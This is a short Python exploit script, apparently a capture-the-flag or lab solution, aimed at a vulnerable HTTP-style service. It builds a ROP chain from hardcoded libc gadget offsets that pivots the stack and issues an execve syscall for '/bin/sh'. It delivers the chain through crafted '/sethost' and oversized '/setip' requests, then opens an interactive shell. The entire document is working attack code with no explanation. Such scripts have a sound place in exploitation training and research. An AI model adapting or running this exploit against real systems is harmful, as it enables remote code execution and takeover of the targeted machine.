import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

libc_addr = 0x7f000042c000
payload_addr = 0x604488
binsh_addr = 0x604479
statusTable_index = 651

gadgets = [
    libc_addr + 0x7f0c4, # xchg edi, esp  (pivot)
    libc_addr + 0x33544, 0x3b, # pop rax, 0x3b
    libc_addr + 0x1b92, 0, # pop rdx 0
    libc_addr + 0x202e8, 0, # pop rsi 0
    libc_addr + 0x21102, binsh_addr, # pop rdi, ['/bin/sh']
    libc_addr + 0xbc375 # syscall
]

# Create payload
payload = p64(statusTable_index) + p64(payload_addr + 24)
for gadget in gadgets:
    payload += p64(gadget)
payload += 'a'*100

# Set hostname to include pointer at end
p.sendline('GET /sethost?host=pwn' + '\x88\x44\x60')

# Make a really really long IP address, insert payload at end in correct spot
p.sendline('GET /setip?ip0=3147483677&ip1=3147483677&ip2=3147483677&ip3=127&/bin/sh\x00'+'a'*7 + payload)

p.interactive()